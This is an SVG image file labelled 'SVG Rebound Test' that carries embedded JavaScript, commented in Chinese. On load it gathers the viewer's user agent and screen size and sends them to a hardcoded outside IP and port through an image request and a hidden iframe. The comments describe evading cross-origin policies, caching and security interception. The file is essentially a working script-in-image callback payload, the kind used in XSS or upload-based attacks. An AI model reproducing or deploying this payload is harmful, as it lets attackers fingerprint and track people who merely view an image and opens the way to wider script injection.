<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg width="200" height="100" version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <rect width="200" height="100" fill="#f0f0f0" stroke="#333" stroke-width="2"/>
  <text x="100" y="50" font-family="Arial" font-size="14" text-anchor="middle" fill="#333">
    SVG Rebound Test
  </text>
  <script type="text/javascript"><![CDATA[
    // 你的服务器公网IP（已填好，无需修改）
    const SERVER_IP = "38.162.113.47"; 
    const PORT = 4645;

    // 生成随机数，避免浏览器缓存/拦截
    const random = Math.random().toString(36).substring(2);
    // 简化客户端信息，减少URL长度（降低拦截概率）
    const clientInfo = {
      ua: navigator.userAgent.substring(0, 100), // 缩短UA长度
      scr: screen.width + "x" + screen.height,
      r: random // 随机数参数
    };

    // 核心：绕过跨域/引用策略的反弹方法
    function sendRebound() {
      try {
        const query = new URLSearchParams(clientInfo).toString();
        const url = `http://${SERVER_IP}:${PORT}/rebound?${query}`;
        
        // 方案1：Image标签+强制异步加载（绕过策略限制）
        const img = new Image();
        img.crossOrigin = "anonymous"; // 关键：添加跨域标识
        img.onload = function() {};
        img.onerror = function() {}; // 忽略错误，避免控制台报错
        img.src = url;

        // 方案2：iframe兜底（双重保障）
        const iframe = document.createElement("iframe");
        iframe.style.display = "none";
        iframe.src = url;
        document.body.appendChild(iframe);

        alert("✅ 反弹请求已发送！请查看服务器终端");
        console.log("发送的请求URL:", url);
      } catch (error) {
        console.error("发送失败:", error);
        alert("❌ 发送失败，查看控制台日志");
      }
    }

    // 延迟执行，避开页面加载时的安全拦截
    setTimeout(sendRebound, 100);
  ]]></script>
</svg>